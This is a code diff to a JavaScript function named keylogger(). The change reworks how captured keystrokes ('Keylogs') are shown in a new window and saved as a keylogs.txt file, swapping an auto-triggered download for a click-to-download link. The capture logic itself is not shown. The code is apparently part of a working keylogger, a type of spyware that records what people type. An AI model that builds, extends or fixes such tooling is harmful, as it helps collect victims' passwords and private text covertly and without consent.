@@ -100,20 +100,23 @@ function keylogger() {
             <head><title>Keylogs</title></head>
             <body>
                 <h1>Keylogs</h1>
-                <pre id="keylogContent">${keylogs.reverse().join('\n')}</pre>
-                <a id="downloadLink" href="#" download="keylogs.txt">Download Keylogs</a>
+                <pre id="keylogContent">${keylogs.reverse().join('\\n')}</pre>
+                <a id="downloadLink" href="#">Download Keylogs</a>
                 <script>
-                    // Create a blob from keylogs and initiate download
+                    // Create a blob from keylogs
                     const keylogs = ${JSON.stringify(keylogs.reverse())};
                     const blob = new Blob([keylogs.join('\\n')], { type: 'text/plain' });
                     const url = URL.createObjectURL(blob);
-                    document.getElementById('downloadLink').href = url;
-
-                    // Auto-click the download link to trigger the download
-                    document.getElementById('downloadLink').click();
-
-                    // Clean up URL object after download
-                    URL.revokeObjectURL(url);
+                    
+                    // Set up the download link
+                    const downloadLink = document.getElementById('downloadLink');
+                    downloadLink.href = url;
+                    downloadLink.download = 'keylogs.txt';
+                    
+                    // Trigger the download
+                    downloadLink.onclick = function() {
+                        setTimeout(() => URL.revokeObjectURL(url), 1000); // Clean up URL object after download
+                    };
                 </script>
             </body>
             </html>
@@ -125,6 +128,7 @@ function keylogger() {
         newWindow.document.close();
     });
 }
+
 
 
 
